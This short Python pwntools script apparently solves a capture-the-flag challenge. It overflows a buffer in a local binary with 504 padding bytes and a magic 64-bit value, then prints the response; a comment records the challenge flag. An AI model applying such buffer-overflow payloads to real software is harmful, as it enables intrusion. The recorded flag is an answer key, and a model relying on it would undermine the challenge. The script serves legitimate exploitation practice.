from pwn import *
elf = context.binary = ELF("./pwnable", checksec=False)

p = process('./pwnable')
# p = remote("IP_ADDR", PORT)

offset = 500 + 4
payload = b'A' * offset + p64(0xdeadb19b00b5dead)
p.sendlineafter(b"> ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCF2024{pagi_pagi_begini_main_ctf?_hoaam_tidur_pun_sodap_ni}

p.close()